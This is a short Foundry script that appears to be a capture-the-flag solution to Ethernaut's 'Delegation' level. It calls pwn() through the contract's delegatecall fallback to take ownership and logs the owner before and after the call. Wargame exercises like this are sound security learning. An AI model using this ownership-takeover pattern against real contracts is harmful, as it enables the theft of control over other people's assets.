pragma solidity ^0.8.0;

import "../src/level6.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";



contract Solution is Script {
    Delegation public ins = Delegation(0xcef8c4D2B6225628f80f875F69803A0CFA93B9d7);
    // SPDX-License-Identifier: MIT
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        //delegatecall execute with msg.sender = atk.address, also with atk storage and msg.value
        console.log(ins.owner());
        address(ins).call(abi.encodeWithSignature("pwn()"));
        console.log(ins.owner());
        vm.stopBroadcast();

    }
}